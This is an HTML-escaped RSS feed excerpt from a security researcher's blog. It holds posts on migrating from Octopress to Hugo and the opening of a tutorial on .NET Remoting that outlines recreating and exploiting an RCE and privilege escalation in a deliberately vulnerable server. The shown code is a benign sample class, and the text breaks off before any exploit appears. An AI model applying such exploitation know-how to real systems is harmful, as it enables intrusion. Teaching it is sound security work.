  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figcaption&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  	&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;codecaption shortcode&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figcaption&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;codewrapper&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;highlighttable&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;figure&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;imagecap:4451b754531b2eca1dcd74c8f975ea86&#34;&gt;imagecap&lt;/h4&gt;

&lt;p&gt;Image caption was similarly simple. I tried to imitate the output of &lt;code&gt;imgcap&lt;/code&gt; plugin in Octopress.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;imgcap&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;caption-wrapper&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;caption&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;{{ .Get &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;src&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;}}&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;{{ .Get &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;caption&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;}}&amp;quot;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;alt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;{{ .Get &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;caption&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;}}&amp;quot;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;caption-text&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;{{ .Get &amp;quot;caption&amp;quot; }}&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;replacing-liquid-tags:4451b754531b2eca1dcd74c8f975ea86&#34;&gt;Replacing Liquid tags&lt;/h3&gt;

&lt;p&gt;The next step was to replace the liquid tags used in Markdown files. I had a few different types of tags for images and codeblocks. I used a few &lt;code&gt;sed&lt;/code&gt; commands to search and replace them&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Why Hugo?</title>
      <link>http://parsiya.net/blog/2016-01-31-Why-Hugo/</link>
      <pubDate>Sun, 31 Jan 2016 20:22:19 -0500</pubDate>
      
      <guid>http://parsiya.net/blog/2016-01-31-Why-Hugo/</guid>
      <description>

&lt;p&gt;As you may have noticed (well no one reads this so I am fine), I have moved from &lt;a href=&#34;http://octopress.org&#34; target=&#34;_blank&#34;&gt;Octopress&lt;/a&gt; to &lt;a href=&#34;https://gohugo.io&#34; target=&#34;_blank&#34;&gt;Hugo&lt;/a&gt;. I have been trying to make this change for a while but due to laziness and some other matters it did not happen. I am going to talk about why I decided on the move and what I did. In then ext post I will talk about my migration from Octopress to Hugo.&lt;/p&gt;

&lt;h3 id=&#34;octopress-the-bad-parts:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;Octopress the Bad Parts&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Octopress had become so slow. Although I do not have many blog posts, they are usually long and contain images and code. Also it does not support incremental generation which means that every time I wanted to push my blog, I had to re-create the blog from scratch. I could live with this because I only do new posts every once in a while so waiting a couple of minutes before deploying the website is not inconvenient.&lt;/li&gt;
&lt;li&gt;My main problem was during content creation. Every time I wanted to look at my changes I had to wait 30 seconds and then refresh the page manually to see the changes. This became very inconvenient. I started creating my posts in a local markdown editor (with preview support) and then copy/pasting it into the actual markdown file and looking at the result. However, modifying posts still took a lot of time and effort.&lt;/li&gt;
&lt;li&gt;Octopress was written in Ruby. I am not a developer but I have written Ruby code (some of which are closer in your everyday lives than they appear &lt;code&gt;;)&lt;/code&gt;) but as you can see in my &lt;a href=&#34;http://parsiya.net/blog/2015-07-26-Image-Popup-and-Octopress/&#34; title=&#34;Image Popup and Octopress&#34; target=&#34;_blank&#34;&gt;imgpopup plugin post&lt;/a&gt;, creating plugins for Octopress was a pain for me.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;octopress-the-good-parts:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;Octopress the Good Parts&lt;/h3&gt;

&lt;p&gt;Hafiz the famous ancient Persian poet said &amp;ldquo;عیب می جمله چو گفتی هنرش نیز بگو&amp;rdquo; which basically means that you should talk about the strengths [of something] after you have ranted about the problems.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Clean theme: The Octopress classic theme is great. I really like it.&lt;/li&gt;
&lt;li&gt;It does what it claims. You can install it using a gem and set up your posts and it is probably good to go. Most probably you will not encounter a bug.&lt;/li&gt;
&lt;li&gt;Posts can be written in Markdown.&lt;/li&gt;
&lt;li&gt;It has a lot of plugins for everyday use out of the box. There are plugins for code, images, videos and tweets.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Does this mean that Octopress is a bad static website generator? Not really but it did not work for me.&lt;/p&gt;

&lt;h3 id=&#34;what-i-wanted:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;What I Wanted&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Be reasonably fast.&lt;/li&gt;
&lt;li&gt;Code and image caption plugins. Most static website generators supports code highlight by default but I really like code and image captions. Either it should be supported or I could create my own plugin.&lt;/li&gt;
&lt;li&gt;Have the Octopress classic theme or a similar theme.&lt;/li&gt;
&lt;li&gt;Allows me to migrate my posts from Octopress. In other words, support writing posts in Markdown. This is supported by almost all static website generators.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I could go to &lt;a href=&#34;https://jekyllrb.com/&#34; target=&#34;_blank&#34;&gt;Jekyll&lt;/a&gt; and almost everything would work without problems but creating plugins would be a pain. After all Octopress is built on top of Jekyll. Some call it a fancy front-end for Jekyll but I disagree.&lt;/p&gt;

&lt;p&gt;I shopped around looking for static website generator and my final choices were &lt;a href=&#34;http://blog.getpelican.com/&#34; target=&#34;_blank&#34;&gt;Pelican&lt;/a&gt; and &lt;a href=&#34;https://gohugo.io&#34; target=&#34;_blank&#34;&gt;Hugo&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;pelican:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;Pelican&lt;/h4&gt;

&lt;p&gt;This &lt;a href=&#34;https://jakevdp.github.io/blog/2013/05/07/migrating-from-octopress-to-pelican/&#34; target=&#34;_blank&#34;&gt;post&lt;/a&gt; titles &amp;ldquo;Migrating from Octopress to Pelican&amp;rdquo; by Jake Vanderplas was really helpful and that was one of the reasons I almost chose Pelican and even modified most of my posts to work in Pelican.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Pelican is reasonably fast. I was amazed after I changed something in my post and saved and the page in browser auto-refreshed with changes within a few seconds.&lt;/li&gt;
&lt;li&gt;It is written in Python. Nowadays I write most of my code in Python but creating the plugins were a pain. I fiddled with them for a few days and gave up after I could not create what I wanted.

&lt;ul&gt;
&lt;li&gt;There is a figure with caption plugin called &lt;a href=&#34;https://github.com/getpelican/pelican-plugins/tree/master/better_figures_and_images&#34; target=&#34;_blank&#34;&gt;better figures and images&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;There is no code caption plugin. I tried creating my own but I got lost. The reason was that because the code is not a one liner (it has an opening tag and closing tag with code int between), I had to create a Markdown pre-processor. There is an &lt;a href=&#34;https://github.com/getpelican/pelican-plugins/blob/master/liquid_tags/include_code.py&#34; target=&#34;_blank&#34;&gt;Include_code plugin&lt;/a&gt; that creates a highlighted code block with caption but it only supports pulling from a file. That would not work for me.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Someone has already done it. &lt;a href=&#34;https://github.com/duilio/pelican-octopress-theme&#34; target=&#34;_blank&#34;&gt;https://github.com/duilio/pelican-octopress-theme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;I only needed to modify some tags but it mostly worked.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Pelican was a really good fit. However, the pains that I had to go through in order to create a codeblock with captions plugin (Markdown preprocessor what?), made me skip this and go for Hugo.&lt;/p&gt;

&lt;h5 id=&#34;hugo:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;Hugo&lt;/h5&gt;

&lt;p&gt;I will talk about why I chose Hugo and the migration in length in the next post. But for now let&amp;rsquo;s see if Hugo is a good fit for my requirements.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;It is reasonably fast. Similar to Pelican when I modified a Markdown file, the browser auto-refreshed and I could see the changes in a few seconds.&lt;/li&gt;
&lt;li&gt;Hugo had neither. However it supports &lt;a href=&#34;https://gohugo.io/extras/shortcodes/&#34; target=&#34;_blank&#34;&gt;shortcodes&lt;/a&gt; and I could create both in a few minutes. I will talk about what I did and how I did it in the migration post.&lt;/li&gt;
&lt;li&gt;Hugo does not have the classic Octopress theme and this was a big weakness compared to Pelican. But as you can see I made my own. It was a good exercise in learning about the inner workings of Hugo and &lt;code&gt;css&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Not only Hugo supports Markdown, it has an &lt;a href=&#34;https://gohugo.io/commands/hugo_import_jekyll/&#34; target=&#34;_blank&#34;&gt;import Jekyll&lt;/a&gt; module which works for Octopress. It seems like a good number of people have moved to Hugo from Jekyll because there are a good number Jekyll themes ported to Hugo. For a list of Hugo themes you can visit &lt;a href=&#34;https://github.com/spf13/hugoThemes/&#34; target=&#34;_blank&#34;&gt;this repo&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;conclusion:6e4dd96c118f451aabe1dc11a2f8644f&#34;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Hugo fit my criteria better than Pelican (or any other static website generator that I encountered during my search). It did not have the Octopress classic them but I created my own. In the next blog post I will talk about my migration from Octopress to Hugo.&lt;/p&gt;

&lt;!-- links --&gt;
</description>
    </item>
    
    <item>
      <title>Intro to .NET Remoting for Hackers</title>
      <link>http://parsiya.net/blog/2015-11-14-Intro-to-.NET-Remoting-for-Hackers/</link>
      <pubDate>Sat, 14 Nov 2015 16:22:36 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-11-14-Intro-to-.NET-Remoting-for-Hackers/</guid>
      <description>

&lt;p&gt;This is a simple tutorial about &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/kwdt6w2k%28v=vs.71%29.aspx&#34; target=&#34;_blank&#34;&gt;.NET Remoting&lt;/a&gt;. I am going to re-create a very simple RCE and local privilege escalation that I encountered in my projects and use it to explain .NET Remoting and simple debugging in &lt;code&gt;dnSpy&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In this post we will:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Do a brief introduction to .NET Remoting&lt;/li&gt;
&lt;li&gt;Develop a simple .NET Remoting client and a vulnerable server in Visual Studio&lt;/li&gt;
&lt;li&gt;Observe .NET Remoting traffic&lt;/li&gt;
&lt;li&gt;See .NET Remoting in action by doing some basic debugging with dnSpy&lt;/li&gt;
&lt;li&gt;Re-create the vulnerable application&lt;/li&gt;
&lt;li&gt;Use dnSpy to patch and create modified .NET modules to exploit our sample vulnerable server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you know of any applications that use .NET Remoting please let me know. I want to look at them.&lt;/p&gt;

&lt;h3 id=&#34;table-of-contents:a4cceda545ee0d0782d3d591639b4015&#34;&gt;Table of Contents:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#ch0&#34;&gt;0. Ingredients and Setup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch1&#34;&gt;1. Brief Intro to .NET Remoting&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch2&#34;&gt;2. Developing a .NET Remoting Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch3&#34;&gt;3. .NET Remoting Messages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch4&#34;&gt;4. Debugging with dnSpy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch5&#34;&gt;5. Re-creating the Vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch6&#34;&gt;6. Modifying IL Instructions with dnSpy and Patching Binaries&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ch7&#34;&gt;7. Remediation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;a-name-ch0-a-0-ingredients-and-setup:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch0&#34;&gt;&lt;/a&gt; 0. Ingredients and Setup&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Windows 7 Virtual Machine&lt;/li&gt;
&lt;li&gt;Visual Studio Community 2015: &lt;a href=&#34;https://www.visualstudio.com/en-us/products/visual-studio-community-vs.aspx&#34; target=&#34;_blank&#34;&gt;https://www.visualstudio.com/en-us/products/visual-studio-community-vs.aspx&lt;/a&gt;. We only need the C# components which are part of the default installation&lt;/li&gt;
&lt;li&gt;RawCap to capture local traffic&lt;/li&gt;
&lt;li&gt;Wireshark to analyze captured traffic&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/0xd4d/dnSpy/releases/tag/v1.4.0.0&#34; target=&#34;_blank&#34;&gt;dnSpy (1.4.0.0)&lt;/a&gt; to decompile and debug C# code&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;a-name-ch1-a-1-brief-intro-to-net-remoting:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch1&#34;&gt;&lt;/a&gt; 1. Brief Intro to .NET Remoting&lt;/h3&gt;

&lt;p&gt;In simple words, .NET Remoting is a means to achieve InterProcess Communication (IPC). One application (let&amp;rsquo;s call it server) exposes some remotable objects. Other applications (we will call them clients) create an instance of those objects and treat them like local objects. But these local objects will be executed on the server. Usually these remotable objects are in a shared library (e.g. DLL). Both client and server will have a copy of this DLL. .NET Remoting can use TCP, HTTP or named pipes to transfer the remotable objects.&lt;/p&gt;

&lt;p&gt;The concept of .NET Remoting is very similar to &lt;a href=&#34;http://www.oracle.com/technetwork/java/javase/tech/index-jsp-138781.html&#34; target=&#34;_blank&#34;&gt;Java Remote Method Invocation (Java RMI)&lt;/a&gt;. In Java RMI we will see serialized Java objects being passed around and in .NET Remoting we will see .NET objects.&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t worry if you do not understand parts of it because this was a very short intro. We will see how .NET Remoting works later.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: .NET Remoting is deprecated and you should not be using it. But who am I kidding? We are all using old technology all the time so we might as well get used to it.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch2-a-2-developing-a-net-remoting-application:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch2&#34;&gt;&lt;/a&gt; 2. Developing a .NET Remoting Application&lt;/h3&gt;

&lt;p&gt;I am going to create two version of my simple .NET Remoting applications. Both are very simple. The first application will act as tutorial about how to create a .NET Remoting client/server application and the second aims to re-create a vulnerable server that I encountered in one of my projects.&lt;/p&gt;

&lt;p&gt;I am going to be using &lt;a href=&#34;https://www.visualstudio.com/en-us/products/visual-studio-community-vs.aspx&#34; target=&#34;_blank&#34;&gt;Visual Studio Community 2015&lt;/a&gt; which is free. We will have three different projects in one solution:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Remoting Library: A DLL which contains the remotable objects.&lt;/li&gt;
&lt;li&gt;Server&lt;/li&gt;
&lt;li&gt;Client&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you want to play along, Visual Studio solutions are at &lt;a href=&#34;https://bitbucket.org/parsiya/net-remoting/src/.&#34; target=&#34;_blank&#34;&gt;https://bitbucket.org/parsiya/net-remoting/src/&lt;/a&gt;. With compiled executables being in the &lt;code&gt;Executables&lt;/code&gt; directory (keep in mind that these are executables from a stranger on the internet so treat them accordingly).&lt;/p&gt;

&lt;p&gt;First the DLL. Create a solution and a new project. Choose &lt;code&gt;Class Library&lt;/code&gt; as type of the project. According to &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/vstudio/h8f0y3fc%28v=vs.100%29.aspx&#34; target=&#34;_blank&#34;&gt;this MSDN article&lt;/a&gt;, in order for an object to be remotable it should either be &lt;code&gt;Serializable&lt;/code&gt; or inherit &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/system.marshalbyrefobject%28v=vs.110%29.aspx&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;MarshalByRefObject&lt;/code&gt;&lt;/a&gt; class. I am taking the &lt;code&gt;MarshalByRefObject&lt;/code&gt; route. For more information please refer to &lt;a href=&#34;https://msdn.microsoft.com/library/wcf3swha%28v=vs.100%29.aspx&#34; target=&#34;_blank&#34;&gt;Making Objects Remotable&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s how the Remoting Library (the DLL) looks like:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;RemotingLibrary.cs&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections.Generic;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Linq;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Text;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Threading.Tasks;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingSample&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;RemoteMath&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MarshalByRefObject&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Add&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b)&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;// add&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Add({0},{1}) called&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b);&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Sub&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b)&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;// subtract&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Sub({0},{1}) called&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b);&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Note that the class &lt;code&gt;RemoteMath&lt;/code&gt; is derived from &lt;code&gt;MarshalByRefObject&lt;/code&gt; to make it remotable. We don&amp;rsquo;t need to do anything else with regards to .NET Remoting in this DLL. Each function will print some text when it is called so we can see where the function actually runs.&lt;/p&gt;

&lt;p&gt;Create a new project named &lt;code&gt;Server&lt;/code&gt; and use the following code. The comments should explain what is happening:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Server.cs&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
